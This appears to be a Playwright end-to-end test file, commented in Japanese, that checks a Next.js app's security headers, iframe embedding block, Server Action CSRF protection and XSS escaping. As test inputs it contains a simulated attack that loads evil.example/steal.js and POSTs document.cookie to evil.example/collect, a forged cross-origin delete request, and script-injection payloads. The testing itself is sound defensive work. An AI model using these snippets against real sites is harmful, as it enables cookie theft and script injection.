/**
 * セキュリティヘッダー・Server Actions の CSRF 対策・XSS 対策が効いていること
 * （第14章、docs/security.md）。設定があることではなく、ブラウザとサーバーが
 * 実際に止めることを確かめる。
 */
import { expect, test } from "@playwright/test";
import {
  createCustomer,
  ORG,
  storageStates,
  uniqueSuffix,
} from "./helpers";
import { callServerAction, serverActionId } from "./server-actions";

const EVIL = "https://evil.example";
const CUSTOMER_ACTIONS =
  "src/app/(dashboard)/[org]/customers/actions.ts";

test.describe("セキュリティヘッダー", () => {
  for (const path of ["/login", `/${ORG}/customers`]) {
    test(`${path} に CSP と固定のヘッダーが付く`, async ({
      page,
    }) => {
      const response = await page.request.get(path);
      const headers = response.headers();
      const csp = headers["content-security-policy"] ?? "";
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("base-uri 'self'");
      expect(csp).toContain("frame-ancestors 'none'");
      // next start は本番モード。React は eval を使わない
      expect(csp).not.toContain("'unsafe-eval'");
      expect(headers["x-content-type-options"]).toBe("nosniff");
      expect(headers["x-frame-options"]).toBe("DENY");
      expect(headers["referrer-policy"]).toBe(
        "strict-origin-when-cross-origin",
      );
      expect(headers["x-powered-by"]).toBeUndefined();
    });
  }

  test("CSP が外部のスクリプトと外部への送信を止める", async ({
    page,
  }) => {
    await page.goto(`/${ORG}/customers`);
    // XSS で入れられたのと同じ状況を、ページの中で作る
    const violations = await page.evaluate(async (evil) => {
      const seen: string[] = [];
      document.addEventListener("securitypolicyviolation", (e) => {
        seen.push(`${e.effectiveDirective} ${e.blockedURI}`);
      });
      const script = document.createElement("script");
      script.src = `${evil}/steal.js`;
      document.body.append(script);
      await fetch(`${evil}/collect`, {
        method: "POST",
        body: document.cookie,
      }).catch(() => undefined);
      await new Promise((r) => setTimeout(r, 500));
      return seen;
    }, EVIL);
    expect(violations).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /^script-src-elem https:\/\/evil\.example/,
        ),
        expect.stringMatching(/^connect-src https:\/\/evil\.example/),
      ]),
    );
  });
});

test.describe("埋め込みの禁止", () => {
  // ログイン画面は未ログインで試す（ログイン済みだと別の画面へ移る）
  test.use({ storageState: { cookies: [], origins: [] } });

  test("他のサイトの iframe に埋め込めない（クリックジャッキング）", async ({
    page,
    baseURL,
  }) => {
    // ログイン画面は Cookie なしで開ける（SameSite=Lax の Cookie は
    // 他のサイトの iframe には付かないので、ログインが要る画面では試せない）
    const login = new URL("/login", baseURL).href;
    // 対照と本番で iframe の URL を変える（同じ URL だとキャッシュから表示される）
    const control = `${login}?embed=control`;
    // 他のサイトのページを Playwright が返す。オリジン（ホスト名）だけを
    // 変える。https の外部のサイトにすると、http の iframe が混在
    // コンテンツで、公開のサイトから localhost への埋め込みが Chrome の
    // Local Network Access で止まり、CSP を確かめられない
    const url = new URL(baseURL!);
    url.hostname = "127.0.0.1";
    const evil = url.origin;
    await page.route(`${evil}/*`, (route) =>
      route.fulfill({
        // charset がないと title が文字化けしてセレクターに一致しない
        contentType: "text/html; charset=utf-8",
        body: `<iframe title="埋め込み" src="${route.request().url().endsWith("/control") ? control : login}"></iframe>`,
      }),
    );
    const heading = page
      .frameLocator('iframe[title="埋め込み"]')
      .getByRole("heading", { name: "ログイン" });

    // 対照：CSP と X-Frame-Options を外すと、埋め込んだ画面が表示される
    await page.route(control, async (route) => {
      const response = await route.fetch();
      const headers = { ...response.headers() };
      delete headers["content-security-policy"];
      delete headers["x-frame-options"];
      await route.fulfill({ response, headers });
    });
    await page.goto(`${evil}/control`);
    await expect(heading).toBeVisible();

    // 実際のヘッダーでは、ブラウザが表示しない。goto は iframe の読み込み
    // （load）まで待つ。止められた iframe は Chromium のエラーページになる
    await page.goto(`${evil}/real`);
    await expect
      .poll(() => page.frames().map((f) => f.url()))
      .toContain("chrome-error://chromewebdata/");
    await expect(heading).toHaveCount(0);
  });
});

test.describe("Server Actions の CSRF 対策", () => {
  test("他のサイトの Origin から送られた Server Action は実行されない", async ({
    page,
    baseURL,
  }, testInfo) => {
    const id = await createCustomer(
      page,
      `CSRF ${uniqueSuffix(testInfo)}`,
    );
    const actionId = serverActionId(
      CUSTOMER_ACTIONS,
      "deleteCustomerAction",
    );
    // ログイン済みの Cookie を持ったまま、Origin だけを他のサイトにする
    const response = await callServerAction(page.request, {
      path: `/${ORG}/customers/${id}`,
      actionId,
      args: [ORG, id],
      origin: EVIL,
      baseURL: baseURL!,
    });
    expect(response.status()).toBeGreaterThanOrEqual(400);
    await page.goto(`/${ORG}/customers/${id}`);
    await expect(
      page.getByRole("heading", { name: /さんの情報$/ }),
    ).toBeVisible();
  });

  test("セッションの Cookie は HttpOnly・SameSite=Lax（他のサイトの POST に付かない）", async ({
    browser,
  }) => {
    const context = await browser.newContext({
      storageState: storageStates.owner,
    });
    const cookies = await context.cookies();
    const session = cookies.find((c) =>
      c.name.endsWith("better-auth.session_token"),
    );
    expect(session).toMatchObject({
      httpOnly: true,
      sameSite: "Lax",
    });
    await context.close();
  });
});

test.describe("XSS 対策", () => {
  test("顧客の氏名・メモに入れた HTML はそのまま文字として表示され、実行されない", async ({
    page,
  }, testInfo) => {
    const name = `<img src=x onerror="window.__xss=1"> ${uniqueSuffix(testInfo)}`;
    const note = `<script>window.__xss=2</script>"><svg onload="window.__xss=3">`;
    const dialogs: string[] = [];
    page.on("dialog", (d) => {
      dialogs.push(d.message());
      void d.dismiss();
    });

    const id = await createCustomer(page, name, { note });
    await page.goto(`/${ORG}/customers/${id}`);
    await expect(
      page.getByRole("heading", { name: `${name} さんの情報` }),
    ).toBeVisible();
    await expect(page.getByLabel("メモ")).toHaveValue(note);
    // 一覧（検索結果）でも文字として出る
    await page.goto(
      `/${ORG}/customers?${new URLSearchParams({ q: name })}`,
    );
    await expect(page.getByText(name).first()).toBeVisible();

    expect(
      await page.evaluate(
        () => (window as unknown as { __xss?: number }).__xss,
      ),
    ).toBeUndefined();
    await expect(
      page.locator('img[src="x"], svg[onload]'),
    ).toHaveCount(0);
    expect(dialogs).toEqual([]);
  });
});
